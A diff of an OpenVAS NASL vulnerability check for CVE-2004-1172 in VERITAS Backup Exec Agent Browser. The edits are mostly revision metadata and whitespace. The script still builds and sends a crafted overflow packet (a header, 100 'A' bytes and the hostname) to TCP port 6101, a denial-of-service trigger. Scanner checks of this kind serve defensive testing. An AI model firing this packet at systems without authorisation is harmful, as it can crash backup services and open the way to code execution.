@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_veritas_backup_exec_agent_browser_bof_vuln.nasl 11425 2018-09-17 09:11:30Z asteins $
+# $Id: gb_veritas_backup_exec_agent_browser_bof_vuln.nasl 11504 2018-09-20 12:55:48Z cfischer $
 #
 # VERITAS Backup Exec Agent Browser Remote Buffer Overflow Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802981");
-  script_version("$Revision: 11425 $");
+  script_version("$Revision: 11504 $");
   script_cve_id("CVE-2004-1172");
   script_bugtraq_id(11974);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-17 11:11:30 +0200 (Mon, 17 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 14:55:48 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-10-11 13:42:29 +0530 (Thu, 11 Oct 2012)");
   script_name("VERITAS Backup Exec Agent Browser Remote Buffer Overflow Vulnerability");
   script_category(ACT_DENIAL);
@@ -50,14 +50,19 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow attackers to overflow a buffer and
   execute arbitrary code on the system.");
+
   script_tag(name:"affected", value:"Veritas Backup Exec Agent Browser version 8.x before 8.60.3878 Hotfix 68,
   and 9.x before 9.1.4691 Hotfix 40");
+
   script_tag(name:"insight", value:"The name server registration service (benetns.exe) fails to validate the
   client hostname field during the registration process, which leads into
   stack-based buffer overflow.");
+
   script_tag(name:"solution", value:"Upgrade to Veritas Backup Exec Agent Browser 8.60.3878 Hotfix 68 or
   9.1.4691 Hotfix 40 or later,
+
   For updates refer to http://www.symantec.com/index.jsp");
+
   script_tag(name:"summary", value:"This host is running VERITAS Backup Exec Agent Browser and is prone
   to buffer overflow vulnerability.");
 
@@ -67,19 +72,12 @@ if(description)
   exit(0);
 }
 
-
 port = 6101;
-
-
 if(!get_port_state(port)){
   exit (0);
 }
 
 hostname = get_host_name();
-if(!hostname){
-  exit(0);
-}
-
 soc = open_sock_tcp (port);
 if(!soc){
   exit (0);
@@ -87,9 +85,6 @@ if(!soc){
 
 req = raw_string (0x02, 0x00, 0x00, 0x00) + crap (data:'A', length:100) +
       raw_string (0x00) + hostname + raw_string (0x00);
-
-
-## Send request
 send (socket:soc, data:req);
 
 close (soc);
